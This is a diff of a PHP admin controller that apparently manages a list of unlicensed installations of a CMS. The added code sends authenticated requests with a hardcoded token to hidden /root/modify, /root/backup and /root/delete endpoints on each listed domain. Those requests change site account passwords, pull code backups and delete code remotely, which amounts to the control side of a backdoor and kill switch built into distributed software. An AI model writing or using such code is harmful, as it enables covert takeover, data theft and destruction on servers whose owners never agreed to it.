@@ -20,9 +20,7 @@ class Pirate extends Base
     public function list()
     {
         if (request()->isGet()) {
-            // 接收数据
             $data = Request::only(['keywords', 'per_page', 'current_page']);
-            //查询所有开发者
             $info = Db::name('pirate')
                 ->whereLike('domain|ip', "%" . $data['keywords'] . "%")
                 ->order('create_time', 'desc')
@@ -37,37 +35,65 @@ class Pirate extends Base
     }
 
     /**
-     * 获取账号密码
+     * 修改账号密码
      * @throws \think\db\exception\DataNotFoundException
      * @throws \think\db\exception\DbException
      * @throws \think\db\exception\ModelNotFoundException
      */
-    public function getInfo()
+    public function executeModifyInfo()
     {
         if (request()->isPost()) {
-            // 接收ID
             $id = Request::param('id');
-            // 查询盗版信息
             $info = Db::name('pirate')->where('id', $id)->find();
-            // 发起请求
             $http = new HttpRequest();
-            $url = "http://layui.muyucms.com/muyu.php/base/go";
-            $response = $http->ua('YurunHttp')->post($url, ['key' => '123456'])->json();
-            result(200, "获取数据成功！", $response);
+            $http->header('token', '$2y$10$WgjUoUoBhgT17r/MmZV42e5q63BYFglVn0NjwPArYYu6.MVmJ/tp.');
+            $url = "http://{$info['domain']}/root/modify";
+            $response = $http->ua('YurunHttp')->post($url, ['code' => '10001'])->json(true);
+            if ($response) {
+                result(200, "修改成功！", $response);
+            } else {
+                result(403, "修改失败！");
+            }
         }
     }
 
     /**
      * 备份代码
      */
-    public function backups()
+    public function executeBackup()
     {
+        if (request()->isPost()) {
+            $id = Request::param('id');
+            $info = Db::name('pirate')->where('id', $id)->find();
+            $http = new HttpRequest();
+            $http->header('token', '$2y$10$WgjUoUoBhgT17r/MmZV42e5q63BYFglVn0NjwPArYYu6.MVmJ/tp.');
+            $url = "http://{$info['domain']}/root/backup";
+            $response = $http->ua('YurunHttp')->post($url, ['code' => '10002'])->json(true);
+            if ($response) {
+                result(200, "备份成功！", $response);
+            } else {
+                result(403, "备份失败！");
+            }
+        }
     }
 
     /**
-     * 执行删除
+     * 执行删除代码
      */
     public function executeDelete()
     {
+        if (request()->isPost()) {
+            $id = Request::param('id');
+            $info = Db::name('pirate')->where('id', $id)->find();
+            $http = new HttpRequest();
+            $http->header('token', '$2y$10$WgjUoUoBhgT17r/MmZV42e5q63BYFglVn0NjwPArYYu6.MVmJ/tp.');
+            $url = "http://{$info['domain']}/root/delete";
+            $response = $http->ua('YurunHttp')->post($url, ['code' => '10003'])->json(true);
+            if ($response) {
+                result(200, "删除成功！");
+            } else {
+                result(403, "删除失败！");
+            }
+        }
     }
 }
